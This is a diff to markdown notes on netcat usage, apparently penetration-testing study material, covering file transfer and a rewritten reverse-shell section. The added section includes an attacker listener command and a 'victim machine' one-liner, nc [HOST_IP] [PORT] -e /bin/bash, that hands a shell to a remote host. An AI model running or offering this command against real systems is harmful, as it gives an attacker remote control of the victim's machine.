@@ -27,7 +27,6 @@ For a UDP connection we only add the `-u` option.
 
 ## File Transfer
 Transfer files over the connection from one system to another without distortion.
-Don’t really care about which is the server and which is the client because the transfer can go either direction but we need to run the listener first.
 
 > Listener
 ```bash
@@ -41,12 +40,15 @@ $ nc -w3 @Listener_IP PORT < /path/to/infile
 [-w]: Define the timeout in seconds.
 
 
-## 
+## Reverse Shell
+Use netcat in server mode to listen for connections then supply the shell from the client. This will allow the session on the server to run commands on the client once the shell is received.
 
-Send a Reverse Shell
+> Server (Attacker Machine)
+```bash
+$ nc -lvnp 8080
+```
 
-From target machine:
-
+> Client (Victim Machine)
 ```bash
 $ nc [HOST_IP] [PORT] -e /bin/bash
 ```
